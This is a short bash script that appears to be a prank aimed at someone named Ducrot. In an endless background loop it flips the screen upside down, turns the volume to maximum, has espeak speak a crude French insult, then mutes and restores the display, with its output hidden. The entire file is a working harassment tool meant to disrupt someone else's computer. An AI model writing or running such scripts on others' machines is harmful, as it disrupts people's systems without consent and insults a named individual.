#!/bin/bash

cd /tmp
mkfifo FIFO > /dev/null 2>&1

start() {
  while [ 1 ]; do
    xrandr -o inverted
    amixer set Master 100%+ > /dev/null 2>&1
    espeak -v fr "ducrot" > /dev/null 2>&1
    espeak -v fr "grosse" > /dev/null 2>&1
    espeak -v fr "mer2" > /dev/null 2>&1
    amixer set Master 0%- > /dev/null 2>&1
    sleep 1
    xrandr -o normal
  done;
}

start & > /dev/null 2>&1
